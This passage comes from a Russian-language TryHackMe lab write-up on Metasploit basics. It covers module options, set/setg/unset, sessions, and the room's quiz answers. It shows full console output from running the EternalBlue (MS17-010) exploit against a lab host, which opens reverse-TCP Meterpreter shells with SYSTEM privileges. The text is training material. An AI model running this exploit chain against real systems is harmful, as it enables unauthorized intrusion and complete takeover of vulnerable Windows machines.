- `RHOSTS`: «Удаленный хост», IP-адрес целевой системы. Можно задать один IP-адрес или диапазон сетей. Это будет 
поддерживать нотацию CIDR (Classless Inter-Domain Routing) (/24, /16 и т. д.) или диапазон сетей (10.10.10.x – 10.10.
10.y). Вы также можете использовать файл, в котором перечислены цели, по одной цели на строку, используя 
file:/path/of/the/target_file.txt, как вы можете видеть ниже.   


- `RPORT`: «Удаленный порт», порт на целевой системе, на котором запущено уязвимое приложение.
- `PAYLOAD`: полезная нагрузка, которую вы будете использовать с эксплойтом.
- `LHOST`: «Localhost», IP-адрес атакующей машины (вашего AttackBox или Kali Linux).
- `LPORT`: «Локальный порт», порт, который вы будете использовать для обратного соединения с оболочкой. Это порт на 
вашей атакующей машине, и вы можете установить его на любой порт, не используемый никаким другим приложением. 
- `SESSION`: Каждое соединение, установленное с целевой системой с помощью Metasploit, будет иметь идентификатор сеанса. 
Вы будете использовать его с постэксплуатационными модулями, которые будут подключаться к целевой системе с помощью 
существующего соединения.


Вы можете переопределить любой установленный параметр с помощью команды set снова с другим значением. Вы также 
можете очистить любое значение параметра с помощью `unset` команды или очистить все установленные параметры с помощью 
`unset all` команды.  


Команда «снять все»
```commandline
msf6 exploit(windows/smb/ms17_010_eternalblue) > unset all
Flushing datastore...
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Вы можете использовать setg команду для установки значений, которые будут использоваться для всех модулей. Команда 
setg используется так же, как команда set. Разница в том, что если вы используете команду set для установки значения 
с помощью модуля и переключаетесь на другой модуль, вам нужно будет установить значение снова. Команда setg 
позволяет вам установить значение, чтобы его можно было использовать по умолчанию в разных модулях. Вы можете 
очистить любое установленное значение с setg помощью unsetg.



В примере ниже используется следующий поток;

- Мы используем эксплуатируемый ms17_010_eternalblue
- Мы устанавливаем переменную RHOSTS с помощью setg команды вместо команды set
- Мы используем back команду, чтобы выйти из контекста эксплойта
- Мы используем вспомогательный модуль (этот модуль является сканером для обнаружения уязвимостей MS17-010)


Команда show options показывает, что параметр RHOSTS уже заполнен IP-адресом целевой системы.
Навигационные модули
```commandline
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > setg rhosts 10.10.165.39
rhosts => 10.10.165.39
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 > use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                                Required  Description
   ----         ---------------                                                --------  -----------
   CHECK_ARCH   true                                                           no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                           no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                          no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /opt/metasploit-framework-5101/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS       10.10.165.39                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT        445                                                            yes       The SMB service port (TCP)
   SMBDomain    .                                                              no        The Windows domain to use for authentication
   SMBPass                                                                     no        The password for the specified username
   SMBUser                                                                     no        The username to authenticate as
   THREADS      1                                                              yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_ms17_010) >
```


Команда `setg` устанавливает глобальное значение, которое будет использоваться до тех пор, пока вы не выйдете из 
Metasploit или не очистите его с помощью `unsetg` команды.


### Использование модулей

После того, как все параметры модуля установлены, вы можете запустить модуль с помощью `exploit` команды. Metasploit 
также поддерживает `run` команду, которая является псевдонимом, созданным для exploit команды, поскольку слово 
«эксплойт» не имело смысла при использовании модулей, которые не были эксплойтами (сканеры портов, сканеры 
уязвимостей и т. д.).


Команду `exploit` можно использовать без параметров или с `-z` параметром « ».

Команда `exploit -z` запустит эксплойт и переведет сеанс в фоновый режим сразу после его открытия.

Команда «exploit -z»
```commandline
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z

[*] Started reverse TCP handler on 10.10.44.70:4444 
[*] 10.10.12.229:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.12.229:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.12.229:445      - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.12.229:445 - Connecting to target for exploitation.
[+] 10.10.12.229:445 - Connection established for exploitation.
[+] 10.10.12.229:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.12.229:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.12.229:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.12.229:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.12.229:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.12.229:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.12.229:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.12.229:445 - Sending all but last fragment of exploit packet
[*] 10.10.12.229:445 - Starting non-paged pool grooming
[+] 10.10.12.229:445 - Sending SMBv2 buffers
[+] 10.10.12.229:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.12.229:445 - Sending final SMBv2 buffers.
[*] 10.10.12.229:445 - Sending last fragment of exploit packet!
[*] 10.10.12.229:445 - Receiving response from exploit packet
[+] 10.10.12.229:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.12.229:445 - Sending egg to corrupted connection.
[*] 10.10.12.229:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.12.229
[*] Meterpreter session 2 opened (10.10.44.70:4444 -> 10.10.12.229:49186) at 2021-08-20 02:06:48 +0100
[+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Session 2 created in the background.
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Это вернет вам контекстную подсказку, из которой вы запустили эксплойт.

Некоторые модули поддерживают эту `check` опцию. Это позволит проверить, уязвима ли целевая система, не эксплуатируя ее.

### Сеансы
После успешной эксплуатации уязвимости будет создан сеанс. Это канал связи, установленный между целевой системой и 
Metasploit. 

Вы можете использовать эту background команду для перевода приглашения сеанса в фоновый режим и возврата к 
приглашению msfconsole. 

Сессии фоновой подготовки
```commandline
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

В качестве альтернативы  CTRL+Z может использоваться для фоновых сеансов.

Эту sessions команду можно использовать из командной строки msfconsole или любого контекста для просмотра 
существующих сеансов. 

Список активных сеансов
```commandline
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)

msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 > sessions 

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)

msf6 >
```


Для взаимодействия с любым сеансом вы можете использовать sessions -i команду, за которой следует желаемый номер сеанса.
Взаимодействие с сессиями
```commandline
msf6 > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)

msf6 > sessions -i 2
[*] Starting interaction with 2...

meterpreter >
```

### Ответить на вопросы ниже
Как бы вы установили значение LPORT на 6666?

```commandline
set LPORT 6666
```
Как бы вы установили глобальное значение для RHOSTS равным 10.10.19.23?

```commandline
setg RHOSTS 10.10.19.23
```
Какую команду вы бы использовали для очистки установленной полезной нагрузки?

```commandline
unset PAYLOAD
```
Какую команду вы используете для перехода к этапу эксплуатации?

```commandline
exploit
```

## Задание 5
Как мы уже видели, Metasploit — это мощный инструмент, который облегчает процесс эксплуатации. Процесс эксплуатации 
состоит из трех основных шагов: поиск эксплойта, настройка эксплойта и эксплуатация уязвимого сервиса.

Metasploit предоставляет множество модулей, которые можно использовать на каждом этапе процесса эксплуатации. В этой 
комнате мы увидели основные компоненты Metasploit и их соответствующее использование.

Было бы лучше, если бы вы также использовали эксплойт ms17_010_eternalblue для получения доступа к целевой 
виртуальной машине. 

В следующих комнатах мы более подробно рассмотрим Metasploit и его компоненты. После завершения этот модуль должен 
дать вам хорошее представление о возможностях Metasploit. 

### Ответить на вопросы ниже
Ответ не требуется.
```commandline
Ответ не нужен
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)